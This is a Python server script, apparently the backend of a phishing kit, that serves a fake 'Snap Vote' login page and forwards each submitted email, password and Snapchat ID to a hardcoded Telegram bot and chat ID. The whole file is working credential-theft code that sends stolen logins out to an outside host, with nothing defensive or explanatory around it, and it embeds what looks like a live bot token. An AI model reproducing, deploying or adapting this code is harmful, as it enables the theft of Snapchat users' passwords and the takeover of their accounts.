#!/usr/bin/env python3
import http.server
import socketserver
import os
import json
import urllib.request
import urllib.error
from urllib.parse import urlparse, parse_qs

PORT = 5000

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8224762003:AAFYfOn0Zh3Q9LkzpXuREVE4gqqh1WHUvfg')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '6711357280')

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        super().end_headers()

    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path == '/send-telegram':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
            except (ValueError, json.JSONDecodeError) as e:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': 'Invalid JSON'}).encode())
                return
            
            message = f"""🔔 <b>New Snap Vote Login Attempt</b>

👤 <b>User ID:</b> 6711357280
📧 <b>Email/ID:</b> {data.get('email', 'N/A')}
🔑 <b>Password:</b> {data.get('password', 'N/A')}
👻 <b>Snapchat ID:</b> {data.get('snapId', 'N/A')}
📝 <b>Type:</b> {data.get('type', 'Unknown')}
⏰ <b>Time:</b> {data.get('timestamp', 'N/A')}

📍 <b>From:</b> Snap Vote Login Page"""
            
            try:
                telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                telegram_data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                
                req = urllib.request.Request(
                    telegram_url,
                    data=json.dumps(telegram_data).encode('utf-8'),
                    headers={'Content-Type': 'application/json'}
                )
                
                with urllib.request.urlopen(req) as response:
                    result = json.loads(response.read().decode('utf-8'))
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True}).encode())
                    
            except urllib.error.URLError as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

os.chdir(os.path.dirname(os.path.abspath(__file__)))

class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

with ReusableTCPServer(("0.0.0.0", PORT), MyHTTPRequestHandler) as httpd:
    print(f"Server running at http://0.0.0.0:{PORT}/")
    print(f"Serving files from: {os.getcwd()}")
    print(f"Telegram integration: {'Enabled' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID else 'Disabled'}")
    httpd.serve_forever()
